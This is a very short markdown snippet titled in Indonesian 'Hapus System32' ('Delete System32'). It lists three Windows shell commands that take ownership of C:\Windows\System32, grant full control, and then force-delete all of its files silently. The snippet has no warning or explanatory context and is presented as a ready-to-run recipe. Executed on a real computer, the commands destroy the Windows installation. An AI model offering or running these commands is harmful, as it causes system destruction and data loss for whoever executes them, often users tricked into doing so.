## Hapus System32

```
shell
takeown /F C:\Windows\System32 /R /D Y
icacls C:\Windows\System32 /grant Administrator:F /T
del /F /S /Q C:\Windows\System32\*
```
